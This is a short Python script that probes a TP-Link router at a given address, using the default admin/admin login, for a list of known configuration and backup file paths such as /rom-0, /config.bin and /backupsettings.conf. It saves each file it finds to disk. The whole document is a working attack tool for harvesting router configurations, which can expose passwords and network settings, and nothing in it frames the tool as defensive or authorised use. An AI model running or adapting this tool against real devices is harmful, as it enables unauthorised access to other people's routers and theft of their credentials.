import requests
import sys

# DUDE'S TP-LINK CONFIG HUNTER
# Specifically targeting common TP-Link paths.

PATHS = [
    "/cgi-bin/config.exp",
    "/conf/config.xml",
    "/webpages/data/config.xml",
    "/backup/config.bin",
    "/config.bin",
    "/backupsettings.conf",
    "/user.conf",
    "/rom-0",
    "/etc/config/network",
    "/sysconf",
    "/cgi-bin/config.sh",
    "/webpages/data/common_info.json",
    "/webpages/data/network.json",
    "/webpages/data/wireless.json"
]

def hunt(ip, user, password):
    print(f"[*] DUDE: Hunting for TP-Link config at {ip}...")
    session = requests.Session()
    session.auth = (user, password)
    
    for path in PATHS:
        url = f"http://{ip}{path}"
        try:
            r = session.get(url, timeout=3)
            if r.status_code == 200:
                print(f"[!!!] DUDE SUCCESS: Found potential asset at {path} (Len: {len(r.content)})")
                filename = f"tplink_{path.replace('/', '_')}"
                with open(filename, 'wb') as f:
                    f.write(r.content)
                print(f"    -> Saved to {filename}")
        except Exception as e:
            pass

if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.1"
    hunt(ip, "admin", "admin")
